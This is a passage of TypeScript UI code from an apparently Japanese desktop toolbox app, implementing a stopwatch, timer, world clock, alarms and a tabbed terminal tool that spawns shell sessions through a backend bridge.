      alert("インポート失敗: " + String(e));
    }
    importFile.value = "";
  });
  render();
}

// ===== クロック =====
function setupClockTool(): void {
  const tabs = document.querySelectorAll<HTMLButtonElement>(".cl-tab");
  if (tabs.length === 0) return;
  const panes = document.querySelectorAll<HTMLDivElement>(".cl-pane");
  function showPane(id: string): void {
    tabs.forEach((b) => b.classList.toggle("active", b.dataset.clTab === id));
    panes.forEach((p) => {
      p.hidden = p.dataset.clPane !== id;
    });
  }
  tabs.forEach((b) =>
    b.addEventListener("click", () => showPane(b.dataset.clTab ?? "stopwatch")),
  );
  showPane("stopwatch");

  // ---- ストップウォッチ ----
  const swDisp = document.getElementById("cl-sw-display") as HTMLDivElement;
  const swStart = document.getElementById("cl-sw-start") as HTMLButtonElement;
  const swLap = document.getElementById("cl-sw-lap") as HTMLButtonElement;
  const swReset = document.getElementById("cl-sw-reset") as HTMLButtonElement;
  const swLapsBody = (
    document.getElementById("cl-sw-laps") as HTMLTableElement
  ).querySelector("tbody") as HTMLTableSectionElement;
  let swStartTs = 0;
  let swElapsedBeforePause = 0;
  let swRunning = false;
  let swTimer: number | null = null;
  const swLaps: number[] = [];
  function fmtMs(ms: number): string {
    const h = Math.floor(ms / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    const x = Math.floor(ms % 1000);
    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}.${String(x).padStart(3, "0")}`;
  }
  function swElapsed(): number {
    return swRunning
      ? swElapsedBeforePause + (Date.now() - swStartTs)
      : swElapsedBeforePause;
  }
  function swTick(): void {
    swDisp.textContent = fmtMs(swElapsed());
  }
  swStart.addEventListener("click", () => {
    if (swRunning) {
      swElapsedBeforePause += Date.now() - swStartTs;
      swRunning = false;
      if (swTimer) {
        clearInterval(swTimer);
        swTimer = null;
      }
      swStart.textContent = "▶ 再開";
    } else {
      swStartTs = Date.now();
      swRunning = true;
      swTimer = window.setInterval(swTick, 31);
      swStart.textContent = "⏸ 停止";
    }
  });
  swLap.addEventListener("click", () => {
    const t = swElapsed();
    swLaps.push(t);
    const tr = document.createElement("tr");
    const idx = swLaps.length;
    const lapDelta = idx === 1 ? t : t - swLaps[idx - 2];
    tr.innerHTML = `<td style="padding:4px">${idx}</td><td style="padding:4px;text-align:right;font-family:monospace">${fmtMs(lapDelta)}</td><td style="padding:4px;text-align:right;font-family:monospace">${fmtMs(t)}</td>`;
    swLapsBody.insertBefore(tr, swLapsBody.firstChild);
  });
  swReset.addEventListener("click", () => {
    swRunning = false;
    swElapsedBeforePause = 0;
    if (swTimer) {
      clearInterval(swTimer);
      swTimer = null;
    }
    swLaps.length = 0;
    swLapsBody.textContent = "";
    swStart.textContent = "▶ スタート";
    swTick();
  });
  swTick();

  // ---- タイマー ----
  const tmH = document.getElementById("cl-tm-h") as HTMLInputElement;
  const tmM = document.getElementById("cl-tm-m") as HTMLInputElement;
  const tmS = document.getElementById("cl-tm-s") as HTMLInputElement;
  const tmDisp = document.getElementById("cl-tm-display") as HTMLDivElement;
  const tmBar = document.getElementById("cl-tm-bar") as HTMLDivElement;
  const tmStart = document.getElementById("cl-tm-start") as HTMLButtonElement;
  const tmPause = document.getElementById("cl-tm-pause") as HTMLButtonElement;
  const tmReset = document.getElementById("cl-tm-reset") as HTMLButtonElement;
  const tmStatus = document.getElementById("cl-tm-status") as HTMLSpanElement;
  const tmBeep = document.getElementById("cl-tm-beep") as HTMLInputElement;
  const tmLoop = document.getElementById("cl-tm-loop") as HTMLInputElement;
  let tmTotalMs = 0;
  let tmRemainingMs = 0;
  let tmEndAt = 0;
  let tmRunning = false;
  let tmTimer: number | null = null;
  function tmReadInputs(): number {
    return (
      (parseInt(tmH.value || "0") * 3600 +
        parseInt(tmM.value || "0") * 60 +
        parseInt(tmS.value || "0")) *
      1000
    );
  }
  function tmFmt(ms: number): string {
    if (ms < 0) ms = 0;
    const h = Math.floor(ms / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
  }
  function tmRender(): void {
    tmDisp.textContent = tmFmt(tmRemainingMs);
    const pct = tmTotalMs === 0 ? 0 : (tmRemainingMs / tmTotalMs) * 100;
    tmBar.style.width = Math.max(0, Math.min(100, pct)) + "%";
  }
  function tmBeepSound(): void {
    try {
      const ctx = new (
        window.AudioContext || (window as any).webkitAudioContext
      )();
      for (let i = 0; i < 3; i++) {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.frequency.value = 880;
        osc.type = "sine";
        gain.gain.value = 0.3;
        osc.connect(gain).connect(ctx.destination);
        osc.start(ctx.currentTime + i * 0.4);
        osc.stop(ctx.currentTime + i * 0.4 + 0.25);
      }
      setTimeout(() => ctx.close(), 2000);
    } catch {
      /* ignore */
    }
  }
  function tmFinish(): void {
    tmRunning = false;
    if (tmTimer) {
      clearInterval(tmTimer);
      tmTimer = null;
    }
    tmRemainingMs = 0;
    tmRender();
    tmStatus.textContent = "⏰ タイマー終了";
    if (tmBeep.checked) tmBeepSound();
    if ("Notification" in window) {
      try {
        if (Notification.permission === "granted")
          new Notification("⏰ タイマー終了");
        else if (Notification.permission !== "denied")
          Notification.requestPermission().then((p) => {
            if (p === "granted") new Notification("⏰ タイマー終了");
          });
      } catch {
        /* ignore */
      }
    }
    if (tmLoop.checked) {
      tmTotalMs = tmReadInputs();
      tmRemainingMs = tmTotalMs;
      tmStart.click();
    }
  }
  function tmTick(): void {
    tmRemainingMs = tmEndAt - Date.now();
    if (tmRemainingMs <= 0) {
      tmFinish();
      return;
    }
    tmRender();
  }
  tmStart.addEventListener("click", () => {
    if (tmRunning) return;
    if (tmRemainingMs <= 0) {
      tmTotalMs = tmReadInputs();
      tmRemainingMs = tmTotalMs;
    }
    if (tmRemainingMs <= 0) {
      tmStatus.textContent = "時間を設定してください";
      return;
    }
    tmEndAt = Date.now() + tmRemainingMs;
    tmRunning = true;
    tmTimer = window.setInterval(tmTick, 200);
    tmStatus.textContent = "実行中…";
  });
  tmPause.addEventListener("click", () => {
    if (!tmRunning) return;
    tmRemainingMs = tmEndAt - Date.now();
    tmRunning = false;
    if (tmTimer) {
      clearInterval(tmTimer);
      tmTimer = null;
    }
    tmStatus.textContent = "一時停止中";
  });
  tmReset.addEventListener("click", () => {
    tmRunning = false;
    if (tmTimer) {
      clearInterval(tmTimer);
      tmTimer = null;
    }
    tmTotalMs = tmReadInputs();
    tmRemainingMs = tmTotalMs;
    tmRender();
    tmStatus.textContent = "";
  });
  document
    .querySelectorAll<HTMLButtonElement>(".cl-tm-preset")
    .forEach((btn) => {
      btn.addEventListener("click", () => {
        const sec = parseInt(btn.dataset.sec ?? "0");
        tmH.value = String(Math.floor(sec / 3600));
        tmM.value = String(Math.floor((sec % 3600) / 60));
        tmS.value = String(sec % 60);
        tmTotalMs = sec * 1000;
        tmRemainingMs = tmTotalMs;
        tmRender();
      });
    });
  [tmH, tmM, tmS].forEach((el) =>
    el.addEventListener("input", () => {
      if (!tmRunning) {
        tmTotalMs = tmReadInputs();
        tmRemainingMs = tmTotalMs;
        tmRender();
      }
    }),
  );
  tmTotalMs = tmReadInputs();
  tmRemainingMs = tmTotalMs;
  tmRender();

  // ---- 世界時計 ----
  const WC_KEY = "yuzu-clock-tz-v1";
  const wcList = document.getElementById("cl-wc-list") as HTMLUListElement;
  const wcAdd = document.getElementById("cl-wc-add") as HTMLInputElement;
  const wcAddBtn = document.getElementById(
    "cl-wc-add-btn",
  ) as HTMLButtonElement;
  const defaultTzs = [
    "Asia/Tokyo",
    "America/New_York",
    "America/Los_Angeles",
    "Europe/London",
    "Europe/Paris",
    "Asia/Shanghai",
    "Australia/Sydney",
  ];
  let tzs: string[] = defaultTzs;
  try {
    const raw = localStorage.getItem(WC_KEY);
    if (raw) tzs = JSON.parse(raw);
  } catch {
    /* ignore */
  }
  function wcRender(): void {
    wcList.textContent = "";
    const now = new Date();
    for (const tz of tzs) {
      const li = document.createElement("li");
      li.className = "cl-wc-item";
      let timeStr = "";
      let dateStr = "";
      try {
        timeStr = new Intl.DateTimeFormat("ja-JP", {
          timeZone: tz,
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: false,
        }).format(now);
        dateStr = new Intl.DateTimeFormat("ja-JP", {
          timeZone: tz,
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          weekday: "short",
        }).format(now);
      } catch {
        timeStr = "(invalid TZ)";
      }
      li.innerHTML = `<div style="flex:1"><div style="font-weight:bold">${tz}</div><div style="font-size:11px;color:#666">${dateStr}</div></div><div style="font-family:ui-monospace,Consolas,monospace;font-size:24px">${timeStr}</div>`;
      const del = document.createElement("button");
      del.type = "button";
      del.textContent = "✖";
      del.addEventListener("click", () => {
        tzs = tzs.filter((x) => x !== tz);
        localStorage.setItem(WC_KEY, JSON.stringify(tzs));
        wcRender();
      });
      li.appendChild(del);
      wcList.appendChild(li);
    }
  }
  wcAddBtn.addEventListener("click", () => {
    const v = wcAdd.value.trim();
    if (!v) return;
    try {
      new Intl.DateTimeFormat("ja-JP", { timeZone: v });
    } catch {
      alert("無効なタイムゾーンです");
      return;
    }
    if (!tzs.includes(v)) tzs.push(v);
    localStorage.setItem(WC_KEY, JSON.stringify(tzs));
    wcAdd.value = "";
    wcRender();
  });
  document.getElementById("cl-wc-reset-btn")?.addEventListener("click", () => {
    tzs = defaultTzs.slice();
    localStorage.setItem(WC_KEY, JSON.stringify(tzs));
    wcRender();
  });
  wcRender();
  setInterval(wcRender, 1000);

  // ---- アラーム ----
  const AL_KEY = "yuzu-clock-alarm-v1";
  interface Alarm {
    id: string;
    time: string;
    label: string;
    enabled: boolean;
    lastFired: string | null;
  }
  let alarms: Alarm[] = [];
  try {
    const raw = localStorage.getItem(AL_KEY);
    if (raw) alarms = JSON.parse(raw);
  } catch {
    /* ignore */
  }
  const alList = document.getElementById("cl-al-list") as HTMLUListElement;
  function alSave(): void {
    localStorage.setItem(AL_KEY, JSON.stringify(alarms));
  }
  function alRender(): void {
    alList.textContent = "";
    for (const a of alarms) {
      const li = document.createElement("li");
      li.className = "cl-al-item";
      const cb = document.createElement("input");
      cb.type = "checkbox";
      cb.checked = a.enabled;
      cb.addEventListener("change", () => {
        a.enabled = cb.checked;
        alSave();
      });
      const main = document.createElement("div");
      main.style.flex = "1";
      main.innerHTML = `<div style="font-family:ui-monospace,Consolas,monospace;font-size:20px">${a.time}</div><div style="font-size:11px;color:#666">${a.label || "(無題)"}</div>`;
      const del = document.createElement("button");
      del.type = "button";
      del.textContent = "✖";
      del.addEventListener("click", () => {
        alarms = alarms.filter((x) => x.id !== a.id);
        alSave();
        alRender();
      });
      li.appendChild(cb);
      li.appendChild(main);
      li.appendChild(del);
      alList.appendChild(li);
    }
  }
  document.getElementById("cl-al-add")?.addEventListener("click", () => {
    const t = (document.getElementById("cl-al-time") as HTMLInputElement).value;
    const lab = (document.getElementById("cl-al-label") as HTMLInputElement)
      .value;
    if (!t) {
      alert("時刻を入力してください");
      return;
    }
    alarms.push({
      id: Math.random().toString(36).slice(2, 11),
      time: t,
      label: lab,
      enabled: true,
      lastFired: null,
    });
    alSave();
    alRender();
  });
  alRender();
  setInterval(() => {
    const now = new Date();
    const hms =
      String(now.getHours()).padStart(2, "0") +
      ":" +
      String(now.getMinutes()).padStart(2, "0") +
      ":" +
      String(now.getSeconds()).padStart(2, "0");
    const today = now.toISOString().slice(0, 10);
    for (const a of alarms) {
      if (!a.enabled) continue;
      const at = a.time.length === 5 ? a.time + ":00" : a.time;
      if (at === hms && a.lastFired !== today + " " + at) {
        a.lastFired = today + " " + at;
        alSave();
        tmBeepSound();
        if ("Notification" in window) {
          try {
            if (Notification.permission === "granted")
              new Notification("🔔 アラーム", { body: a.label || a.time });
            else Notification.requestPermission();
          } catch {
            /* ignore */
          }
        }
      }
    }
  }, 1000);
}

// ===== ターミナル =====
interface TermSession {
  id: number;
  shell: string;
  cwd: string;
  output: string;
  history: string[];
  histIdx: number;
  alive: boolean;
}

let termSessions: TermSession[] = [];
let termActive: number | null = null;
let termListenerInstalled = false;

function setupTerminalTool(): void {
  const outN = document.getElementById("tm-output") as HTMLPreElement | null;
  if (!outN) return;
  const out = outN;
  const tabs = document.getElementById("tm-tabs") as HTMLDivElement;
  const shellSel = document.getElementById("tm-shell") as HTMLSelectElement;
  const cwdInput = document.getElementById("tm-cwd") as HTMLInputElement;
  const inputEl = document.getElementById("tm-input") as HTMLInputElement;
  const status = document.getElementById("tm-status") as HTMLSpanElement;
  const ansiStrip = document.getElementById(
    "tm-ansi-strip",
  ) as HTMLInputElement;
  const autoscroll = document.getElementById(
    "tm-autoscroll",
  ) as HTMLInputElement;

  function ansiStripFn(s: string): string {
    // CSI sequences + OSC + bell
    return s
      .replace(/\x1b\[[0-9;?]*[A-Za-z]/g, "")
      .replace(/\x1b\][^\x07]*\x07/g, "")
      .replace(/\x1b\[\?[0-9;]*[hl]/g, "")
      .replace(/\x07/g, "")
      .replace(/\r(?!\n)/g, "");
  }

  function getActive(): TermSession | null {
    if (termActive == null) return null;
    return termSessions.find((s) => s.id === termActive) ?? null;
  }
  function renderTabs(): void {
    tabs.textContent = "";
    for (const s of termSessions) {
      const div = document.createElement("div");
      div.className = "tm-tab" + (s.id === termActive ? " active" : "");
      div.textContent = `${s.shell} #${s.id}`;
      if (!s.alive) div.textContent += " [終了]";
      div.addEventListener("click", () => {
        termActive = s.id;
        renderTabs();
        renderOutput();
      });
      const close = document.createElement("span");
      close.className = "tm-tab-close";
      close.textContent = "✖";
      close.addEventListener("click", (e) => {
        e.stopPropagation();
        if (s.alive)
          invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
        termSessions = termSessions.filter((x) => x.id !== s.id);
        if (termActive === s.id) termActive = termSessions[0]?.id ?? null;
        renderTabs();
        renderOutput();
      });
      div.appendChild(close);
      tabs.appendChild(div);
    }
  }
  function renderOutput(): void {
    const s = getActive();
    if (!s) {
      out.textContent = "(セッションなし — 「新しいタブ」で開始)";
      status.textContent = "";
      return;
    }
    out.textContent = ansiStrip.checked ? ansiStripFn(s.output) : s.output;
    if (autoscroll.checked) out.scrollTop = out.scrollHeight;
    status.textContent = `セッション #${s.id} (${s.shell}) ${s.alive ? "稼働中" : "終了済み"}`;
  }

  if (!termListenerInstalled) {
    termListenerInstalled = true;
    listen<{ session_id: number; stream: string; data: string }>(
      "terminal-output",
      (ev) => {
        const sid = ev.payload.session_id;
        const sess = termSessions.find((s) => s.id === sid);
        if (!sess) return;
        sess.output += ev.payload.data;
        // limit buffer
        if (sess.output.length > 500_000)
          sess.output = sess.output.slice(-400_000);
        if (sid === termActive) renderOutput();
      },
    ).catch(() => undefined);
    listen<{ session_id: number; code: number | null }>(
      "terminal-exit",
      (ev) => {
        const sess = termSessions.find((s) => s.id === ev.payload.session_id);
        if (!sess) return;
        sess.alive = false;
        sess.output += `\n[プロセスが終了しました (code=${ev.payload.code ?? "?"})]\n`;
        renderTabs();
        if (sess.id === termActive) renderOutput();
      },
    ).catch(() => undefined);
  }

  async function newSession(): Promise<void> {
    try {
      const shell = shellSel.value;
      const id = await invoke<number>("terminal_spawn", {
        shell,
        cwd: cwdInput.value || null,
      });
      const sess: TermSession = {
        id,
        shell,
        cwd: cwdInput.value,
        output: "",
        history: [],
        histIdx: -1,
        alive: true,
      };
      termSessions.push(sess);
      termActive = id;
      renderTabs();
      renderOutput();
      inputEl.focus();
    } catch (e) {
      alert("起動失敗: " + String(e));
    }
  }

  document.getElementById("tm-new")?.addEventListener("click", () => {
    void newSession();
  });
  document.getElementById("tm-close")?.addEventListener("click", () => {
    const s = getActive();
    if (!s) return;
    if (s.alive)
      invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
    termSessions = termSessions.filter((x) => x.id !== s.id);
    termActive = termSessions[0]?.id ?? null;
    renderTabs();
    renderOutput();
  });
  document
    .getElementById("tm-pick-cwd")
    ?.addEventListener("click", async () => {
      try {
        const d = await invoke<string | null>("toolbox_pick_download_dir");
        if (d) cwdInput.value = d;
      } catch {
        /* ignore */
      }
    });

  async function send(data: string): Promise<void> {
    const s = getActive();
    if (!s) {
      alert("先にタブを開いてください");
      return;
    }
    if (!s.alive) {
      alert("このセッションは終了しています");
      return;
    }
    try {
      await invoke("terminal_write", { sessionId: s.id, data });
    } catch (e) {
      status.textContent = "送信失敗: " + String(e);
    }
  }

  document.getElementById("tm-send")?.addEventListener("click", () => {
    const cmd = inputEl.value;
    const s = getActive();
    if (s) {
      s.history.push(cmd);
      s.histIdx = -1;
      s.output += "> " + cmd + "\n";
      renderOutput();
    }
    void send(cmd + "\n");
    inputEl.value = "";
  });
  document.getElementById("tm-sigint")?.addEventListener("click", () => {
    void send("\x03");
  });
  document.getElementById("tm-clear")?.addEventListener("click", () => {
    const s = getActive();
    if (s) {
      s.output = "";
      renderOutput();
    }
  });

  inputEl.addEventListener("keydown", (e) => {
    const s = getActive();
    if (e.key === "Enter") {
      e.preventDefault();
      const cmd = inputEl.value;
      if (s) {
        s.history.push(cmd);
        s.histIdx = -1;
        s.output += "> " + cmd + "\n";
        renderOutput();
      }
      void send(cmd + "\n");
      inputEl.value = "";
    } else if (e.key === "ArrowUp") {
      if (!s || s.history.length === 0) return;
      e.preventDefault();
      if (s.histIdx === -1) s.histIdx = s.history.length - 1;
      else s.histIdx = Math.max(0, s.histIdx - 1);
      inputEl.value = s.history[s.histIdx] ?? "";
    } else if (e.key === "ArrowDown") {
      if (!s || s.history.length === 0) return;
      e.preventDefault();
      if (s.histIdx === -1) return;
      s.histIdx = s.histIdx + 1;
      if (s.histIdx >= s.history.length) {
        s.histIdx = -1;
        inputEl.value = "";
      } else inputEl.value = s.history[s.histIdx] ?? "";
    } else if (e.ctrlKey && e.key.toLowerCase() === "l") {
      e.preventDefault();
      if (s) {
        s.output = "";
        renderOutput();
      }
    } else if (
      e.ctrlKey &&
      e.key.toLowerCase() === "c" &&
      inputEl.selectionStart === inputEl.selectionEnd
    ) {
      e.preventDefault();
      void send("\x03");
    }
  });

  ansiStrip.addEventListener("change", renderOutput);
  renderTabs();
  renderOutput();
}
